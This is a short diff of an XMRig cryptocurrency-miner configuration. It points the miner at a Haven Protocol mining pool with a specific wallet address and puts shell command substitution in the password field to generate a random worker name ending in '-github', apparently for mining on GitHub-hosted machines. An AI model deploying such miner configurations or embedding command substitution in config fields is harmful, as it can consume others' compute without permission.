@@ -62,11 +62,11 @@
     "log-file": null,
     "pools": [
         {
-            "algo": null,
+            "algo": "cn-heavy/xhv",
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
-            "pass": "x",
+            "url": "haven.herominers.com:10450",
+            "user": "hvs1JUEon79AQJs1w4XfYZ1mNYBVxunQhKzDGSteHM7QVq6zxEp4KRKVhGJBdzxsioATdRrxDjh2DLbmgxdz7XP22nXEz2Lum1",
+            "pass": "$(echo $(shuf -i 10-99999999999 -n 1)-github)",
             "rig-id": null,
             "nicehash": false,
             "keepalive": false,
